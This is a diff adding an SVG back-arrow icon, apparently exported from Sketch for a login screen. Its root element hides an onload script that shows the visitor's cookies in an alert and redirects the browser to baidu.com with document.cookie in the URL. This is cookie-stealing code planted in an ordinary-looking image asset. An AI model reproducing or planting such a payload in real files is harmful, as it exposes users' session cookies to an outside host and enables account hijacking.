@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="8px" height="14px" viewBox="0 0 8 14" version="1.1" xmlns="http://www.w3.org/2000/svg"
+    xmlns:xlink="http://www.w3.org/1999/xlink"
+    onload="alert`${document.cookie}`;location.href='https://baidu.com?cookie='+document.cookie">
+    <!-- Generator: Sketch 59.1 (86144) - https://sketch.com -->
+    <title>fanhui</title>
+    <desc>Created with Sketch.</desc>
+    <g id="Login" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Sign-In-Head/With-Return" transform="translate(-41.000000, -31.000000)" fill="#A0A5AA"
+            fill-rule="nonzero">
+            <g id="Group-6">
+                <g id="Group-2" transform="translate(41.000000, 27.000000)">
+                    <g id="fanhui" transform="translate(0.000000, 4.000000)">
+                        <path
+                            d="M0.216782897,6.44123732 C0.262723462,6.38685281 0.317568603,6.34066742 0.378977909,6.30465204 L6.44770994,0.230487649 C6.58946693,0.083733138 6.78458048,0.000592933203 6.98861866,0 C7.18263183,0 7.376645,0.0768292162 7.53107949,0.222727122 C7.83141188,0.517627143 7.83451609,0.99877981 7.53884002,1.29833615 L1.85192591,6.99145867 L7.53263159,12.6574194 C7.83072013,12.9560975 7.83417434,13.43865 7.54039212,13.741565 C7.24859631,14.0434495 6.76433943,14.0434495 6.46400704,13.7493255 L0.316893694,7.61773319 C0.106597342,7.46737157 -0.0124854825,7.22013573 0.00104024978,6.96196867 L0.00104024978,6.93868709 C0.00989735767,6.75226471 0.0863097974,6.57544025 0.216006845,6.44123732 L0.216782897,6.44123732 Z"
+                            id="Path"></path>
+                    </g>
+                </g>
+            </g>
+        </g>
+    </g>
+</svg>
